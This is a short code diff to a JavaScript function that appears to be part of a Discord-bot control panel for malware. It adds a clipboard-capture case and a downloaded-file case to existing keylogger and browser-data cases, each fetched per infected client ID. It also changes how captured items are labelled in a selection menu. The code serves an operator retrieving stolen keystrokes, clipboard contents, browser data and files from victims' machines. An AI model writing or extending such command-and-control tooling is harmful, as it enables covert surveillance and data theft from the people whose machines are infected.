@@ -24,9 +24,13 @@ export async function fetchDataAndUpdateInteraction(type, interaction, clientId,
             endpoint = `keylogger/client/${clientId}`;
             contentType = "enregistrement du clavier";
             break;
-        case 'papier':
-            endpoint = `papier/client/${clientId}`;
+        case 'clipboard':
+            endpoint = `clipboard/client/${clientId}`;
             contentType = "récuperation du presse papier";
+            break;
+        case 'downloadfile':
+            endpoint = `download/client/${clientId}`;
+            contentType = "fichier téléchargé";
             break;
 
     }
@@ -41,9 +45,9 @@ export async function fetchDataAndUpdateInteraction(type, interaction, clientId,
         }
 
         const options = items.map(item => ({
-            label: type === 'browserdata' ? item.file_path.split('/').pop() : `${contentType} ${item.id}`,
+            label: type === 'browserdata' || type === 'downloadfile' || type === 'keylogger' || type === 'clipboard' ? item.file_path.split('/').pop() : `${contentType} ${item.id}`,
             description: `Le ${item.date_created}`,
-            value: type === 'browserdata' ? `${item.id}_${item.file_path.split('/').pop()}` : item.id.toString(),
+            value: type === 'browserdata' || type === 'downloadfile' || type === 'keylogger' || type === 'clipboard' ? `${item.id}_${item.file_path.split('/').pop()}` : item.id.toString(),
         }));
 
         const selectMenu = new StringSelectMenuBuilder()
